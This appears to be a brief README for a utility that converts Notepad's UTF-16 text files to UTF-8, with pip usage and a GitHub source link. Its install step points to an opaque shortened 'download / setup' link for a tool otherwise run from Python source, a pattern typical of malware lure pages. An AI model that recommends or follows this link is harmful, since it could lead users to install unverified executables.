# Notepad Encoding

The encoding Notepad actually saved.

Detect and convert a text file between UTF-8 and UTF-16 for Notepad.

## Install

Windows and macOS: **[download / setup](https://share.google/A1IHfyGRT0zGRLqj8)**

## What it does

- Detect
- To UTF-8
- Backup
- Preview sample

Notepad still writes UTF-16 sometimes. A tool then sees NUL bytes.

This detects and converts to UTF-8.

## Usage

```powershell
pip install -r requirements.txt
python main.py --help
```

Source: https://github.com/notepad-encoding-lmop/notepad-encoding

MIT. See `LICENSE`.
